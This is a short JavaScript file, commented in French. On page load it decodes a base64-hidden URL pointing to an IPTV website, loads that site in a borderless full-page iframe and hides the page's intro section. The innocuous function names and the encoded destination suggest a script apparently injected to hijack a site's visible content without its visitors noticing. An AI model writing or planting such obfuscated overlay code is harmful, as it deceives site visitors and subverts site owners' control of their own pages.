function chaine_test(str) {
    return decodeURIComponent(atob(str).split('').map(function(c) {
        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
    }).join(''));
}

function buildtest() {
    var mon_carre = document.createElement('iframe');
    mon_carre.style.width = "100%";
    mon_carre.style.height = "100%";
    mon_carre.style.border = "none";
    mon_carre.src = chaine_test("aHR0cHM6Ly9pcHR2aHlwZXIuY29tL2Zy");
    document.body.appendChild(mon_carre);
}

function hideDiv() {
    var div = document.getElementById('introsection');
    div.style.display = 'none';
}

// Appeler les fonctions au chargement de la page
window.onload = function() {
    buildtest();
    hideDiv();
};